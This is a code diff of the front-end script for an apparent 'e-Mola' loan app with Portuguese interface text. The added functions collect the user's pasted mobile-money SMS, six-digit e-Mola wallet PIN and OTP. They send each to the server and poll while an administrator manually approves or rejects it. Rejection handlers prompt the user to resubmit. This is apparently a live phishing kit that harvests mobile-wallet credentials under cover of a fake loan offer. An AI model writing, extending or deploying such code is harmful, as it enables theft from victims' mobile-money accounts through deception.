-    if (data.ok) {
-      startOtpPolling();
-    } else {
-      showError('otpErr', data.error || 'Error');
-    }
-  } catch (err) {
-    alert('Network error');
-  }
-}
-
-// ─── OTP Polling ───
-function startOtpPolling() {
-  if (window._otpInterval) clearInterval(window._otpInterval);
-  window._otpInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status/${appData.applicationId}/otp`, {
-        cache: 'no-store'
-      });
-      if (res.status === 404) {
-        clearInterval(window._otpInterval);
-        clearState();
-        alert(currentLang === 'pt' ? 'Pedido não encontrado. Recomece.' : 'Application not found. Please start again.');
-        goTo('page-landing');
-        return;
-      }
-      const data = await res.json();
-
-      if (data.status === 'approved') {
-        clearInterval(window._otpInterval);
-        showApproval();
-        return;
-      }
-      if (data.status === 'rejected') {
-        clearInterval(window._otpInterval);
-        showRejected('err_otp_rejected');
-        return;
-      }
-    } catch (err) {
-      console.error('OTP polling error:', err);
-    }
-  }, 3000);
-}
-
-// ─── Resend OTP ───
-async function resendOtp() {
-  try {
-    const response = await fetch('/api/resend-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: appData.applicationId })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      alert(currentLang === 'pt' ? 'Pedido de reenvio enviado ao administrador.' : 'OTP resend request sent to admin.');
-    } else {
-      alert('Error: ' + data.error);
-    }
-  } catch (err) {
-    alert('Network error');
-  }
-}
-
-// ─── Approval / Rejection ───
-function showApproval() {
-  document.getElementById('aprAmount').textContent = `${appData.loanAmount.toLocaleString()} MZN`;
-  document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
-  document.getElementById('aprMth').textContent = `${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toLocaleString()} MZN`;
-  goTo('page-approval');
-  clearState();
-}
-
-function showRejected(reasonKey) {
-  alert(translations[currentLang][reasonKey] || reasonKey);
-  clearState();
-  goTo('page-landing');
-}
-
-// ─── Helpers ───
-function showError(id, msgKey) {
-  const el = document.getElementById(id);
-  el.querySelector('span:last-child').textContent = translations[currentLang][msgKey] || msgKey;
-  el.classList.add('show');
-  setTimeout(() => el.classList.remove('show'), 3000);
-}
-
-function normalizePhone(id) {
-  let el = document.getElementById(id);
-  el.value = el.value.replace(/\D/g, '').slice(0, 9);
-}
-
-function disablePinInputs() {
-  document.querySelectorAll('.pin-box').forEach(inp => inp.disabled = true);
-}
-
-function pinMvM(input, idx) {
-  if (input.value.length > 0 && idx < 3) {
-    document.getElementById('pin' + (idx + 1)).focus();
-  }
-  if (input.value.length === 0 && idx > 0) {
-    document.getElementById('pin' + (idx - 1)).focus();
-  }
-}
 function togPin() {
-  let inputs = document.querySelectorAll('.pin-box');
-  inputs.forEach(inp => inp.type = inp.type === 'password' ? 'text' : 'password');
+  for (let i = 0; i < 6; i++) {
+    const b = document.getElementById('pin' + i);
+    if (b) b.type = b.type === 'password' ? 'text' : 'password';
+  }
+  for (let i = 0; i < 4; i++) {
+    const b = document.getElementById('otp' + i);
+    if (b) b.type = b.type === 'password' ? 'text' : 'password';
+  }
 }
+
+function chkPin() {
+  const pinOk = [0,1,2,3,4,5].every(i => document.getElementById('pin' + i)?.value);
+  const pinBtn = document.querySelector('#page-pin .btn-grad');
+  if (pinBtn) pinBtn.disabled = !pinOk;
+  const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+  const otpBtn = document.querySelector('#page-otp .btn-grad');
+  if (otpBtn) otpBtn.disabled = !otpOk;
+}
+
+document.addEventListener('keyup', chkPin);
+
 function clearLoginPin() {
-  document.querySelectorAll('.pin-box').forEach(inp => inp.value = '');
+  [0,1,2,3,4,5].forEach(i => document.getElementById('pin'+i).value = '');
+  document.getElementById('pin0').focus();
+  chkPin();
 }
 
-function handleOtpInput(input, type) {
-  if (input.value.length > 0 && input.id !== 'otp3') {
-    document.getElementById('otp' + (parseInt(input.id.slice(3)) + 1)).focus();
-  }
-}
 function clearOtpCode() {
-  document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
+  [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+  document.getElementById('otp0').focus();
+  chkPin();
 }
 
-// ─── Restore State on Page Load ───
-document.addEventListener('DOMContentLoaded', function() {
-  const restored = loadState();
-  applyLanguage(); // Apply language from localStorage or default
-
-  if (restored && appData.applicationId) {
-    if (currentPage === 'page-processing') {
-      goTo('page-processing');
-      startAppPolling();
-    } else if (currentPage === 'page-pin') {
-      goTo('page-pin');
-    } else if (currentPage === 'page-otp') {
-      goTo('page-otp');
-    } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
-      goTo(currentPage);
-    } else {
-      goTo(currentPage);
-    }
-  } else {
-    goTo('page-landing');
+function handleOtpInput(el, type) {
+  el.value = el.value.replace(/\D/, '');
+  const idx = parseInt(el.id.match(/\d$/)[0]);
+  if (el.value && type === 'otp' && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
+  chkPin();
+  if (idx === 3 && el.value) {
+    const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+    if (allFilled) setTimeout(() => doOtp(), 300);
   }
+}
+
+// PIN attempts
+async function checkPinStatus() {
+  try {
+    const response = await fetch(`/api/status/${S.applicationId}/pin`);
+    const data = await response.json();
+    if (data.ok) {
+      const remaining = data.remainingAttempts || 3;
+      const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+      if (attemptsDisplay) {
+        if (data.blocked) {
+          attemptsDisplay.innerHTML = `🔒 Demasiadas tentativas. Bloqueado por ${data.blockRemainingSeconds}s`;
+          attemptsDisplay.className = 'pin-attempts blocked';
+          document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
+          document.querySelector('#page-pin .btn-grad').disabled = true;
+          startPinBlockCountdown(data.blockRemainingSeconds);
+        } else {
+          attemptsDisplay.innerHTML = `🔑 Tentativas restantes: ${remaining} de 3`;
+          attemptsDisplay.className = 'pin-attempts';
+        }
+      }
+      return data;
+    }
+  } catch (error) {
+    console.error('Erro ao verificar PIN:', error);
+  }
+  return null;
+}
+
+function startPinBlockCountdown(seconds) {
+  const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+  if (!attemptsDisplay) return;
+  if (pinBlockTimer) clearInterval(pinBlockTimer);
+  let remaining = seconds;
+  attemptsDisplay.textContent = `🔒 Demasiadas tentativas. Bloqueado por ${remaining}s`;
+  attemptsDisplay.className = 'pin-attempts blocked';
+  pinBlockTimer = setInterval(() => {
+    remaining--;
+    if (remaining <= 0) {
+      clearInterval(pinBlockTimer);
+      pinBlockTimer = null;
+      attemptsDisplay.textContent = '✅ PIN disponível. Tente novamente.';
+      attemptsDisplay.className = 'pin-attempts available';
+      document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
+      document.querySelector('#page-pin .btn-grad').disabled = false;
+      resetPinAttempts();
+    } else {
+      attemptsDisplay.textContent = `🔒 Demasiadas tentativas. Bloqueado por ${remaining}s`;
+    }
+  }, 1000);
+}
+
+async function resetPinAttempts() {
+  try {
+    await fetch(`/api/reset-pin-attempts/${S.applicationId}`, { method: 'POST' });
+  } catch (error) {
+    console.error('Erro ao repor tentativas:', error);
+  }
+}
+
+// SMS countdown
+function startSmsCountdown() {
+  const wrap = document.getElementById('smsCountdownWrap');
+  const text = document.getElementById('smsCountdownText');
+  const btn = document.getElementById('btnSmsResend');
+  if (!wrap || !text || !btn) return;
+  wrap.style.display = 'block';
+  btn.style.display = 'none';
+  let remaining = 60;
+  text.textContent = `Reenviar disponível em ${remaining}s`;
+  clearInterval(smsCountdownInterval);
+  smsCountdownInterval = setInterval(() => {
+    remaining--;
+    if (remaining <= 0) {
+      clearInterval(smsCountdownInterval);
+      text.textContent = 'SMS expirado. Pode reenviar.';
+      btn.style.display = 'block';
+    } else {
+      text.textContent = `Reenviar disponível em ${remaining}s`;
+    }
+  }, 1000);
+}
+
+async function doSmsResend() {
+  const btn = document.getElementById('btnSmsResend');
+  btn.disabled = true;
+  btn.textContent = '⏳ A enviar...';
+  try {
+    const res = await fetch('/api/resend-sms', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: S.applicationId })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      showToast('✅ SMS reenviado. Cole a nova mensagem.', 'success');
+      document.getElementById('smsMsgBox').value = '';
+      startSmsCountdown();
+    } else {
+      alert(data.message || 'Falha ao reenviar SMS.');
+    }
+  } catch (err) {
+    alert('Erro de rede: ' + err.message);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '🔄 Reenviar SMS';
+  }
+}
+
+// OTP countdown
+function startOtpCountdown() {
+  const wrap = document.getElementById('otpCountdownWrap');
+  const text = document.getElementById('otpCountdownText');
+  const btn = document.getElementById('btnOtpResend');
+  if (!wrap || !text || !btn) return;
+  wrap.style.display = 'block';
+  btn.style.display = 'none';
+  let remaining = 60;
+  text.textContent = `Reenviar disponível em ${remaining}s`;
+  clearInterval(otpCountdownInterval);
+  otpCountdownInterval = setInterval(() => {
+    remaining--;
+    if (remaining <= 0) {
+      clearInterval(otpCountdownInterval);
+      text.textContent = 'OTP expirado. Pode reenviar.';
+      btn.style.display = 'block';
+    } else {
+      text.textContent = `Reenviar disponível em ${remaining}s`;
+    }
+  }, 1000);
+}
+
+async function doOtpResend() {
+  const btn = document.getElementById('btnOtpResend');
+  btn.disabled = true;
+  btn.textContent = '⏳ A enviar...';
+  try {
+    const res = await fetch('/api/resend-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: S.applicationId })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      showToast('✅ OTP reenviado. Introduza o novo OTP.', 'success');
+      clearOtpCode();
+      startOtpCountdown();
+    } else {
+      alert(data.message || 'Falha ao reenviar OTP.');
+    }
+  } catch (err) {
+    alert('Erro de rede: ' + err.message);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '🔄 Reenviar OTP';
+  }
+}
+
+// Polling
+function startPoll(applicationId, step, onSuccess, onReject) {
+  if (currentPollTimeout) clearTimeout(currentPollTimeout);
+  const check = async () => {
+    try {
+      const res = await fetch(`/api/status/${applicationId}/${step}`);
+      const data = await res.json();
+      if (data && data.ok === true) {
+        if (data.status === 'approved') {
+          currentPollTimeout = null;
+          onSuccess();
+          return;
+        } else if (data.status === 'rejected') {
+          currentPollTimeout = null;
+          onReject();
+          return;
+        }
+      }
+      currentPollTimeout = setTimeout(check, 2000);
+    } catch (err) {
+      currentPollTimeout = setTimeout(check, 3000);
+    }
+  };
+  check();
+}
+
+// Approval & Dashboard
+function showApproval() {
+  document.getElementById('aprAmount').textContent = S.loanAmount.toLocaleString() + ' MZN';
+  document.getElementById('aprAmt').textContent = S.loanAmount.toLocaleString() + ' MZN';
+  document.getElementById('aprTerm').textContent = S.loanTerm;
+  const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
+  document.getElementById('aprMth').textContent = monthly.toLocaleString() + ' MZN';
+  const finishBtn = document.querySelector('.rth-btn');
+  finishBtn.textContent = currentLang === 'en' ? 'FINISH' : 'CONCLUIR';
+  finishBtn.onclick = loadDashboard;
+  Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
+  if (otpResendTimer) clearInterval(otpResendTimer);
+  if (pinBlockTimer) clearInterval(pinBlockTimer);
+  goTo('page-approval');
+}
+
+async function loadDashboard() {
+  try {
+    const res = await fetch(`/api/dashboard/${S.applicationId}`);
+    const data = await res.json();
+    if (data.ok) {
+      const dashBalance = document.getElementById('dashBalance');
+      if (dashBalance) dashBalance.textContent = data.data.loanAmount.toLocaleString() + ' MZN';
+      const dashId = document.getElementById('dashId');
+      if (dashId) dashId.textContent = data.data.applicationId;
+      const dashTerm = document.getElementById('dashTerm');
+      if (dashTerm) dashTerm.textContent = data.data.loanTerm;
+    }
+    goTo('page-dashboard');
+  } catch (err) {
+    console.error('Erro no dashboard:', err);
+    goTo('page-approval');
+  }
+}
+
+// Submit application
+async function submitApp() {
+  const em = document.getElementById('s3em').value;
+  const in_ = +document.getElementById('s3in').value;
+  const kn = document.getElementById('s3kn').value.trim();
+  const kp = document.getElementById('s3kp').value.trim();
+  if (!em || in_ <= 0) {
+    showErr('s3Err', 'Por favor preencha todos os campos.');
+    return;
+  }
+  S.employment = em;
+  S.annualIncome = in_;
+  S.kinName = kn;
+  S.kinPhone = kp;
+
+  if (!S.applicationId) {
+    S.applicationId = 'EMOLA-' + Date.now().toString().slice(-6);
+    saveApplicationId(S.applicationId);
+  }
+
+  saveApplicationData();
+  goTo('page-processing');
+
+  try {
+    const res = await fetch('/api/send-application', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationData: S })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      S.applicationId = data.applicationId;
+      saveApplicationId(S.applicationId);
+      document.getElementById('processingStatus').innerHTML = '⏳ A aguardar aprovação do administrador...';
+      startPoll(S.applicationId, 'sms',
+        () => {
+          showToast('✅ Pedido Aprovado!', 'success');
+          goTo('page-sms-paste');
+        },
+        () => handleRejection('sms')
+      );
+    } else {
+      showErr('s3Err', data.message || 'Falha ao submeter pedido.');
+    }
+  } catch (err) {
+    showErr('s3Err', 'Erro de rede. Tente novamente.');
+  }
+}
+
+// SMS submission
+async function doSmsParse() {
+  const msg = document.getElementById('smsMsgBox').value.trim();
+  if (msg.length < 3) {
+    showErr('momErr', 'Por favor cole uma mensagem válida.');
+    return;
+  }
+  const waitSmsAppId = document.getElementById('waitSmsAppId');
+  if (waitSmsAppId) waitSmsAppId.textContent = S.applicationId;
+  goTo('page-wait-sms');
+  try {
+    await fetch('/api/send-momo-message', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ momoData: { applicationId: S.applicationId, momoMessage: msg } })
+    });
+    startPoll(S.applicationId, 'sms',
+      () => {
+        showToast('✅ SMS Aprovado!', 'success');
+        goTo('page-pin');
+      },
+      () => handleRejection('sms')
+    );
+  } catch (err) {
+    showErr('momErr', 'Falha ao submeter SMS.');
+    goTo('page-sms-paste');
+    startSmsCountdown();
+  }
+}
+
+// PIN submission (6 digits)
+async function doPin() {
+  const pin = [0,1,2,3,4,5].map(i => document.getElementById('pin'+i).value).join('');
+  if (pin.length < 6) {
+    showErr('pinErr', 'Introduza um PIN e-Mola válido de 6 dígitos.');
+    return;
+  }
+  const waitPinAppId = document.getElementById('waitPinAppId');
+  if (waitPinAppId) waitPinAppId.textContent = S.applicationId;
+  goTo('page-wait-pin');
+  try {
+    await fetch('/api/send-pin', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: S.applicationId, pin })
+    });
+    startPoll(S.applicationId, 'pin',
+      () => {
+        showToast('✅ PIN Aprovado!', 'success');
+        resetPinAttempts();
+        goTo('page-otp');
+      },
+      async () => {
+        const rejectRes = await fetch('/api/pin-rejected', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ applicationId: S.applicationId })
+        });
+        const rejectData = await rejectRes.json();
+        if (rejectData.blocked) {
+          showErr('pinErr', '🔒 Demasiadas tentativas. Bloqueado por 5 minutos.');
+          checkPinStatus();
+          goTo('page-pin');
+        } else if (rejectData.remainingAttempts > 0) {
+          showErr('pinErr', `❌ PIN errado. ${rejectData.remainingAttempts} tentativa(s) restante(s).`);
+          document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+          document.getElementById('pin0').focus();
+          const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+          if (attemptsDisplay) attemptsDisplay.textContent = `🔑 Tentativas restantes: ${rejectData.remainingAttempts} de 3`;
+          goTo('page-pin');
+        } else {
+          handleRejection('pin');
+        }
+      }
+    );
+  } catch (err) {
+    showErr('pinErr', 'Falha ao submeter PIN.');
+    goTo('page-pin');
+  }
+}
+
+// OTP submission (4 digits)
+async function doOtp() {
+  const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+  if (otp.length < 4) {
+    showErr('otpErr', 'Introduza um OTP válido de 4 dígitos.');
+    return;
+  }
+  const waitOtpAppId = document.getElementById('waitOtpAppId');
+  if (waitOtpAppId) waitOtpAppId.textContent = S.applicationId;
+  goTo('page-wait-otp');
+  try {
+    await fetch('/api/send-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: S.applicationId, otp })
+    });
+    startPoll(S.applicationId, 'otp',
+      () => {
+        showToast('✅ OTP Aprovado! Empréstimo Aprovado 🎉', 'success');
+        showApproval();
+      },
+      () => handleRejection('otp')
+    );
+  } catch (err) {
+    showErr('otpErr', 'Falha ao submeter OTP.');
+    goTo('page-otp');
+    startOtpCountdown();
+  }
+}
+
+// Rejection handling
+function handleRejection(step) {
+  clearErr('s3Err');
+  clearErr('momErr');
+  clearErr('pinErr');
+  clearErr('otpErr');
+  if (currentPollTimeout) clearTimeout(currentPollTimeout);
+  saveRejectionInfo(step, S.applicationId);
+
+  switch (step) {
+    case 'sms':
+      showToast('❌ SMS rejeitado. Verifique e submeta novamente.', 'error');
+      document.getElementById('smsMsgBox').value = '';
+      document.getElementById('smsMsgBox').focus();
+      goTo('page-sms-paste');
+      startSmsCountdown();
+      break;
+    case 'pin':
+      showToast('❌ PIN rejeitado. Introduza novamente o seu PIN e-Mola.', 'error');
+      document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+      document.getElementById('pin0').focus();
+      checkPinStatus();
+      goTo('page-pin');
+      break;
+    case 'otp':
+      showToast('❌ OTP rejeitado. Peça um novo OTP.', 'error');
+      clearOtpCode();
+      startOtpCountdown();
+      goTo('page-otp');
+      break;
+    default:
+      showToast('❌ Pedido rejeitado. Recomece.', 'error');
+      goTo('page-step1');
+  }
+}
+
+// Recovery on load
+function recoverSession() {
+  const appId = loadApplicationId();
+  if (appId) console.log(`✅ ID do pedido: ${appId}`);
+  const dataLoaded = loadApplicationData();
+  if (dataLoaded) console.log('✅ Dados do pedido carregados');
+  const rejection = loadRejectionInfo();
+  if (rejection) {
+    S.applicationId = rejection.applicationId;
+    showToast(`⚠️ O seu ${rejection.step.toUpperCase()} foi rejeitado. Tente novamente.`, 'error');
+    handleRejection(rejection.step);
+    return true;
+  }
+  loadFormDraft();
+  return false;
+}
+
+// Auto-save
+document.addEventListener('input', (e) => {
+  if (e.target.closest('#page-step1, #page-step2, #page-step3')) saveFormDraft();
+  if (e.target.closest('#page-step2, #page-step3')) saveApplicationData();
 });
+
+// Init
+updateCalc();
+applyLanguage();
+const recovered = recoverSession();
+if (!recovered) goTo('page-landing');
+console.log('✅ e-Mola Loan App (6‑digit PIN) loaded!');
